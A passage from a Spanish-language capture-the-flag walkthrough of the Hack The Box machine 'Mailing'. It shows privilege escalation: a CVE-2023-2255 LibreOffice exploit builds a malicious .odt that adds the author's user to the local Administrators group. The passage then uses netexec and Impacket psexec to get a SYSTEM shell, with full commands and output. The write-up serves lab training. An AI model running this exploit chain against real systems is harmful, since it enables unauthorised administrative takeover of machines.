</span></span></span><span class=line><span class=cl><span class=go>User name                    Administrador
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment                      Cuenta integrada para la administraci¬¢n del equipo o dominio
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               No
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            2024-06-03 6:20:06 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             Never
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          2024-06-03 6:20:06 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Administradores
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Ninguno
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>donde el grupo <code>Administradores</code> es el que llama mi atenci√≥n.</p><p>Creo un nuevo payload en mi m√°quina de atacante el cual agregar√° al usuario <code>gunzf0x</code> al grupo <code>Administradores</code> (o <code>Administrators</code> en ingl√©s):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores gunzf0x /add&#39; --output &#39;privuser.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>File privuser.odt has been created !
</span></span></span></code></pre></div><p>Lo subimos a la m√°quina v√≠ctima y lo copiamos dentro del directorio <code>Important Documents</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; upload privuser.odt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; cmd.exe /c copy C:\Users\maya\Documents\privuser.odt &#39;C:\Important Documents\privuser.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        1 file(s) copied.
</span></span></span></code></pre></div><p>Luego de algunos segundos, si reviso los grupos de mi usuario agregado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\maya\Documents&gt; net user gunzf0x
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User name                    gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>Full Name
</span></span></span><span class=line><span class=cl><span class=go>Comment
</span></span></span><span class=line><span class=cl><span class=go>User&#39;s comment
</span></span></span><span class=line><span class=cl><span class=go>Country/region code          000 (System Default)
</span></span></span><span class=line><span class=cl><span class=go>Account active               Yes
</span></span></span><span class=line><span class=cl><span class=go>Account expires              Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password last set            2024-06-03 6:35:44 AM
</span></span></span><span class=line><span class=cl><span class=go>Password expires             2024-07-15 6:35:44 AM
</span></span></span><span class=line><span class=cl><span class=go>Password changeable          2024-06-03 6:35:44 AM
</span></span></span><span class=line><span class=cl><span class=go>Password required            Yes
</span></span></span><span class=line><span class=cl><span class=go>User may change password     Yes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Workstations allowed         All
</span></span></span><span class=line><span class=cl><span class=go>Logon script
</span></span></span><span class=line><span class=cl><span class=go>User profile
</span></span></span><span class=line><span class=cl><span class=go>Home directory
</span></span></span><span class=line><span class=cl><span class=go>Last logon                   Never
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Logon hours allowed          All
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Local Group Memberships      *Administradores      *Usuarios
</span></span></span><span class=line><span class=cl><span class=go>Global Group memberships     *Ninguno
</span></span></span><span class=line><span class=cl><span class=go>The command completed successfully.
</span></span></span></code></pre></div><p>vemos que √©ste pertenece al grupo <code>Administradores</code> (o <code>Administrators</code>).</p><p>Reviso si tenemos acceso por el servicio <code>SMB</code> con este nuevo falso administrador:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.14 -u &#39;gunzf0x&#39; -p &#39;gunzf0x123$&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.14     445    MAILING          [+] MAILING\gunzf0x:gunzf0x123$ (Pwn3d!)
</span></span></span></code></pre></div><p>Y lo tenemos. Es as√≠ que usar√© <code>psexec.py</code> de <code>Impacket</code> junto con <code>rlwrap</code> para obtener una shell como el usuario <code>nt/authority system</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr python3 /usr/share/doc/python3-impacket/examples/psexec.py gunzf0x:&#39;gunzf0x123$&#39;@mailing.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Requesting shares on mailing.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Found writable share ADMIN$
</span></span></span><span class=line><span class=cl><span class=go>[*] Uploading file CCgKtget.exe
</span></span></span><span class=line><span class=cl><span class=go>[*] Opening SVCManager on mailing.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Creating service puII on mailing.htb.....
</span></span></span><span class=line><span class=cl><span class=go>[*] Starting service puII.....
</span></span></span><span class=line><span class=cl><span class=go>[!] Press help for extra shell commands
</span></span></span><span class=line><span class=cl><span class=go>[-] Decoding error detected, consider running chcp.com at the target,
</span></span></span><span class=line><span class=cl><span class=go>map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
</span></span></span><span class=line><span class=cl><span class=go>and then execute smbexec.py again with -codec and the corresponding codec
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [VersiÔøΩn 10.0.19045.4355]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>(c) Microsoft Corporation. Todos los derechos reservados.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nt authority\system
</span></span></span></code></pre></div><p>Y eso es todo. Podemos leer la flag <code>root.txt</code> en el Escritorio del usuario <code>localadmin</code>.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>